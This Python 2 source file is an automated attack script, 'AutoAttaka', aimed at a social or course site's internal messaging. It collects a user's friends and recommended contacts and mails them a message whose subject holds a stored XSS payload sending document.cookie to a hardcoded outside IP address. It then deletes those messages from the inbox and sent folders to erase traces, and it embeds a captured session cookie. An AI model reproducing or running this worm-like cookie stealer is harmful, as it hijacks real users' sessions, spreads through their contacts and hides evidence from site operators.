#-*- coding:utf-8 -*-

import logs
import UserInfo
import testRequests
import Util
import parseCookie
import urllib
import SweepBack
import param

from bs4 import BeautifulSoup
import re
import time


class AutoAttaka:
    

    sender          = None
    #Cookie 's heart.
    
    @staticmethod
    def establishSender(cookies):
        
        AutoAttaka.cookie      = cookies
        AutoAttaka.sender      = testRequests.LaunchRequest(cookies)
        
    @staticmethod
    def acquireHisList():
        
        
        visited       = AutoAttaka.sender.send(param.Phome_url, None, "get", 1)
        params        = {
            "freshEventCourseBegin" : 0,
            "freshEventDynamicBegin": 0,
            "freshEventTeamBegin"   : 0
            }
        
        #Function Tested.
        #print Util.parsehtml.findFriends(sender.send(AutoAttaka.Friends_url, params, "post" , 1))
        
        Friends         = Util.parsehtml.findFriends(AutoAttaka.sender.send(  param.Friends_url, params, "post", 1))
        Recommenders    = Util.parsehtml.findRecommend(AutoAttaka.sender.send(param.Recommend_url,None, "post", 1))
        HisList         = Friends + Recommenders
        
        return HisList
        
    @staticmethod
    def Mail(username):
        
        AutoAttaka.sender.headers['Referer'] = param.noDecComShowUnReadMessage_url
        visit       = AutoAttaka.sender.send(param.Phome_url, None, "get", 1)
        content     = "<p>老师您好:<br >关于互联网安全问题，您怎样看?</p>"
        
        params = {
            
            "message.receiver"      : username,
            "message.cc_receiver"   : "",
            "message.subject"       : "<img src=1 onError=\"new Image().src=\'http://121.42.199.205:9992/users?\'+document.cookie\"",
            "message.content"       : content
            
            }
        
        AutoAttaka.sender.send(param.Mail_url, params , "post" , 1)
        
    @staticmethod
    def cleanMail():
        
        ptn = re.compile("messageId=(.+?)\'")
        AutoAttaka.sender.headers['Referer'] = param.Clean_url
        contentofRecv = AutoAttaka.sender.send(param.viewMail_url, None, "get", 1)
        contentofSent = AutoAttaka.sender.send(param.sentMail_url, None, "get", 1)
        SweepBack.Sweep.establish(AutoAttaka.cookie)
        soup    = BeautifulSoup(contentofRecv)
        trtag   = soup.find_all('span', class_='ComSubject')
        for tag in trtag:
            #Found Title.
            title = str(tag.contents)
            if "<img" in title:
                time.sleep(1)
                #If saw img as title, then it is our target.
                delv = ptn.findall(str(tag.parent))[0]
                SweepBack.Sweep.sweep(delv, True)
                print "Deleting " + str(delv)
                
        soup2   = BeautifulSoup(contentofSent)
        tRtag   = soup2.find_all('span', class_ = 'ComSubject')
        for tag in tRtag:
            
            title = str(tag.contents)
            if "<img" in title:
                time.sleep(1)
                delv = ptn.findall(str(tag.parent))[0]
                SweepBack.Sweep.sweep(delv, False)
                print "Deleting " + str(delv)
    
if __name__ == "__main__":
    
    if UserInfo.dbopt.checkExistence("test") == 0:
        print "Attack this account"
    if UserInfo.dbopt.checkExistence("test") == 1:
        print "Stop Attack it ,already sent mail."
    
    cookie = "CNZZDATA3458012=cnzz_eid%3D1068221846-1472627900-http%253A%252F%252Fwww.victim.com%252F%26ntime%3D1473170900; JSESSIONID=ADFD4362887B0C21035AF44E0B42815F; jiathis_rdc=%7B%22http%3A//www.victim.com/vpost.html%3Fpid%3D36189%22%3A%220%7C1473171165538%22%7D"
    cookies= parseCookie.parseCookie(cookie)
    AutoAttaka.establishSender(cookies)
    #AutoAttaka.Mail("odasdb")
    #SweepBack.Sweep.establish(cookies)
    AutoAttaka.cleanMail()
    
    
    
    
    
